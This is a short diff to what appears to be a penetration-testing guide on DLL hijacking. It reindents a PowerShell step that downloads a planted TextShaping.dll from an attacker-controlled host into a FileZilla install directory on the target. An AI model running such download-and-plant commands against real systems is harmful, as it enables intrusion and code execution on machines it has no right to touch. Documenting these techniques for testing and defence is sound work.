@@ -146,7 +146,7 @@ Host the DLL on your attacker machine and download it to the writable directory 
    ```
 2. On the target system, download the DLL using PowerShell:
    ```powershell
-iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
+   iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
    ```
 3. Confirm the file exists:
    ```powershell
